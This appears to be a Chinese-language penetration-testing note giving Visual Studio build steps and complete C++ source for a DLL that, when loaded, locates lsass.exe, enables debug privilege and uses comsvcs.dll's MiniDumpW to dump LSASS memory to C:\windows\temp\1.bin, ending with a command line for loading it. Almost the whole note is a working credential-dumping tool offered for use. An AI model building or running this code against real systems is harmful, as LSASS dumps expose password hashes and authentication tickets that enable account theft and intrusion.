	https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/315.png)

	将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。
	（1）添加如下代码
	#pragma comment(lib, "Rpcrt4.lib") （引入Rpcrt4.lib库文件）
	（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）
	（3) 编译时选择x64
	编译得到exe文件
	Visual studio创建c++空项目
	配置类型选dll
	字符集选Unicode，调试器选64位
	Dll保存在C:\\windows\\temp\\1.bin
```cpp
#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>  
#include <map>  
#include <TlHelp32.h> 

#pragma comment(lib,"Dbghelp.lib")
using namespace std;

int FindPID()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		cout << "CreateToolhelp32Snapshot Error!" << endl;;
		return false;
	}

	BOOL bResult = Process32First(hProcessSnap, &pe32);

	while (bResult)
	{
		if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
		{
			return pe32.th32ProcessID;
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}

	CloseHandle(hProcessSnap);

	return -1;
}

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

int dump() {

	HRESULT             hr;
	_MiniDumpW          MiniDumpW;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	ULONG               t;

	MiniDumpW = (_MiniDumpW)GetProcAddress(
		LoadLibrary(L"comsvcs.dll"), "MiniDumpW");

	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
		GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

	if (MiniDumpW == NULL) {

		return 0;
	}
	// try enable debug privilege
	RtlAdjustPrivilege(20, TRUE, FALSE, &t);

	wchar_t  ws[100];
	swprintf(ws, 100, L"%hd%hs", FindPID(), " C:\\windows\\temp\\1.bin full");

	MiniDumpW(0, 0, ws);
	return 0;

}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		dump();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

```
	>xxx.exe c:\xx\xx\xx.dll使用绝对路径